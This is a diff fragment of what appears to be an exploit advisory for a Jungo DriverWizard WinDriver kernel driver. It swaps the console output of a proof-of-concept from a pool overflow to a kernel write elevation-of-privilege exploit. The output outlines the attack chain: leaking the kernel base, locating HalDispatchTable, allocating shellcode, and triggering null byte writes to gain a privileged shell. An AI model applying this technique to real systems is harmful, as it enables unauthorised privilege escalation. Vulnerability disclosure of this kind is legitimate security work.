@@ -69,18 +69,20 @@ debugee\guest
 
 C:\Users\Guest\Desktop>poc.py
 
-        --[ Jungo DriverWizard WinDriver Kernel Pool Overflow EoP exploit ]
+        --[ Jungo DriverWizard WinDriver Kernel Write EoP exploit ]
                        Steven Seeley (mr_me) of Source Incite
 
-(+) spraying pool with mixed objects...
-(+) sprayed the pool!
-(+) making pool holes...
-(+) made the pool holes!
-(+) allocating shellcode...
-(+) allocated the shellcode!
-(+) triggering pool overflow...
-(+) allocating pool overflow input buffer
-(+) elevating privileges!
+(+) attacking target WinDrvr1240
+(+) found ntkrnlpa.exe kernel base address: 0x82c3e000
+(+) loading ntkrnlpa.exe in userland
+(+) found ntkrnlpa.exe Userland Base Address : 0x30f0000
+(+) found HalDispatchTable userland base address: 0x321d440
+(+) found HalDispatchTable kernel base address: 0x82d6b440
+(+) allocating shellcode @ 0xa2
+(+) triggering the first null byte write...
+(+) triggering the second null byte write...
+(+) triggering the third null byte write...
+(+) calling NtQueryIntervalProfile to elevate
 Microsoft Windows [Version 6.1.7601]
 Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 
